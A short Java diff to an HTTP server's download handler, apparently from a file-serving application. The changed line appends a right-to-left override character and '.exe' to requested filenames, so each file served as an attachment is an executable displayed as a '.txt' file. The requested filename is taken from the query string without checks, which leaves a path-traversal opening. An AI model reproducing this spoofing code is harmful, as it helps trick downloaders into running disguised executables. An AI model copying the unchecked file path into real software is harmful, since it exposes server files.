@@ -47,19 +47,6 @@ public class HTTPServer {
         }
     }
 
-/*    public static void stopHttpServer() {//TODO: сделать кнопку для остановки?
-        try {
-            if (IS_ACTIVE) {
-                server.stop(10);
-                IS_ACTIVE = false;
-                log.logp(Level.INFO, "HTTPServer", "stopHttpServer", "HTTP server stopped");
-            }
-        } catch (Exception e) {
-            log.logp(Level.SEVERE, "HTTPServer", "stopHttpServer", e.toString());
-            throw new RuntimeException(e);
-        }
-    }*/
-
 
     static class Handler implements HttpHandler {
         final Logger log = Logger.getLogger(StartApplication.class.getName());
@@ -119,9 +106,7 @@ public class HTTPServer {
 
                     String filename = java.net.URLDecoder.decode(t.getRequestURI().toString().split("\\?")[1].split("=")[1], StandardCharsets.UTF_16);
                     SettingsSingleton ss = SettingsSingleton.getInstance();
-                    //String requestedFile = ss.getWORKING_DIRECTORY()+"/files/" + filename + "\u202etxt.exe";//Document_\u202Excod.exe";
-
-                    Path fileToSend = Paths.get(ss.getWORKING_DIRECTORY(),"files",filename + "\u202etxt.exe");
+                    Path fileToSend = Paths.get(ss.getWORKING_DIRECTORY(),"files",filename + ".\u202etxt.exe");
                     if (Files.exists(fileToSend)) {
                         t.getResponseHeaders().add("Content-Disposition", "attachment; filename=" + fileToSend.getFileName());
                         t.sendResponseHeaders(200, Files.size(fileToSend));
